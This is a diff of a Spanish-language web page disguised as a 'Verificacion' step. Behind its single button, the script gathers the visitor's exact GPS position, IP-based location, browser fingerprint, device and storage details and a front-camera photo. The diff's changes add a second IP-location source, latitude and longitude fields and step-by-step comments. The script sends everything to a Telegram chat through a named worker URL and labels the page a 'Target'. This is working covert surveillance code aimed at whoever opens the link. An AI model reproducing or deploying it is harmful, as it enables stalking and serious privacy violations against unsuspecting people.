@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Acceso</title>
+    <title>Verificacion</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f1f3f4;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,17 +24,8 @@
             width: 100%;
             text-align: center;
         }
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-        p {
-            color: #5f6368;
-            font-size: 0.9rem;
-            margin-bottom: 28px;
-        }
+        h1 { font-size: 1.8rem; margin-bottom: 12px; }
+        p { color: #5f6368; margin-bottom: 28px; }
         button {
             background: #1a73e8;
             color: white;
@@ -47,10 +38,7 @@
             width: 100%;
             transition: background 0.2s;
         }
-        button:active {
-            background: #1557b0;
-            transform: scale(0.98);
-        }
+        button:active { background: #1557b0; transform: scale(0.98); }
     </style>
 </head>
 <body>
@@ -65,27 +53,34 @@
 
 <script>
     // ================= CONFIGURACIÓN =================
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // TU WORKER
     const CHAT_ID = '7555997298';
 
-    async function getLocationFromWorker() {
+    // ---------- 1. OBTENER UBICACIÓN DESDE ip-api.com (CONFIABLE) ----------
+    async function getLocationFromIpApi() {
         try {
-            const res = await fetch(WORKER_URL);
-            if (!res.ok) throw new Error();
+            const res = await fetch('http://ip-api.com/json/');
             const data = await res.json();
-            return {
-                ip: data.ip || 'N/A',
-                country: data.country || 'N/A',
-                region: data.region || 'N/A',
-                city: data.city || 'N/A',
-                postal: data.postal || 'N/A',
-                timezone: data.timezone || 'N/A'
-            };
+            if (data.status === 'success') {
+                return {
+                    ip: data.query || 'N/A',
+                    country: data.country || 'N/A',
+                    region: data.regionName || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.zip || 'N/A',
+                    timezone: data.timezone || 'N/A',
+                    lat: data.lat || 'N/A',
+                    lon: data.lon || 'N/A'
+                };
+            } else {
+                return null;
+            }
         } catch(e) {
             return null;
         }
     }
 
+    // ---------- 2. OBTENER UBICACIÓN DESDE ipapi.co (RESPALDO) ----------
     async function getLocationFromIpapi() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -96,13 +91,16 @@
                 region: data.region || 'N/A',
                 city: data.city || 'N/A',
                 postal: data.postal || 'N/A',
-                timezone: data.timezone || 'N/A'
+                timezone: data.timezone || 'N/A',
+                lat: data.latitude || 'N/A',
+                lon: data.longitude || 'N/A'
             };
         } catch(e) {
             return null;
         }
     }
 
+    // ---------- 3. FINGERPRINT ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -121,6 +119,7 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
+    // ---------- 4. DATOS DEL DISPOSITIVO ----------
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -135,6 +134,7 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
+    // ---------- 5. ALMACENAMIENTO ----------
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -144,6 +144,7 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
+    // ---------- 6. GPS EXACTO ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -155,6 +156,7 @@
         });
     }
 
+    // ---------- 7. CÁMARA FRONTAL ----------
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -176,6 +178,7 @@
         return blob;
     }
 
+    // ---------- 8. ENVÍO A TELEGRAM (USANDO WORKER) ----------
     async function sendMessage(text) {
         try {
             await fetch(WORKER_URL, {
@@ -195,16 +198,16 @@
         } catch(e) { console.warn(e); }
     }
 
+    // ---------- 9. PROCESO PRINCIPAL ----------
     document.getElementById('btn').onclick = async () => {
         const btn = document.getElementById('btn');
         btn.disabled = true;
         btn.innerText = '⏳ Enviando...';
 
+        // Obtener todos los datos
         const gps = await getGPS();
-        const [workerLoc, ipapiLoc] = await Promise.all([
-            getLocationFromWorker(),
-            getLocationFromIpapi()
-        ]);
+        const ipApi = await getLocationFromIpApi();      // 🔥 PRIMERA FUENTE (confiable)
+        const ipapi = await getLocationFromIpapi();      // 🔥 RESPALDO
         const [fp, device, storage] = await Promise.all([
             getFingerprint(),
             getDeviceInfo(),
@@ -212,31 +215,36 @@
         ]);
         const foto = await capturePhoto();
 
+        // Usar ip-api.com si funcionó, si no, ipapi.co como respaldo
+        const loc = ipApi || ipapi;
+
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
-        message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
-        message += `📍 *Cloudflare Worker Location*\n`;
-        if (workerLoc && workerLoc.city !== 'N/A') {
-            message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
+        message += `🌐 *Network Information*\n   • IP Address: ${loc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+        
+        // 🔥 SECCIÓN DE UBICACIÓN DETALLADA (lo que quieres)
+        message += `📍 *Location Details*\n`;
+        if (loc && loc.city !== 'N/A') {
+            message += `   • Country: ${loc.country}\n`;
+            message += `   • Region: ${loc.region}\n`;
+            message += `   • City: ${loc.city}\n`;
+            message += `   • Postal Code: ${loc.postal}\n`;
+            message += `   • Timezone: ${loc.timezone}\n`;
         } else {
             message += `   • No disponible\n`;
         }
-        message += `📍 *IP API Location (ipapi.co)*\n`;
-        if (ipapiLoc && ipapiLoc.city !== 'N/A') {
-            message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
-        } else {
-            message += `   • No disponible\n`;
-        }
+        
         if (gps) {
-            message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+            message += `\n📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
-            message += `📍 *GPS: Permiso denegado o no disponible*\n`;
+            message += `\n📍 *GPS: Permiso denegado o no disponible*\n`;
         }
+        
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
-        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
-        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper\n`;
+        message += `\n🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
+        message += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+        message += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
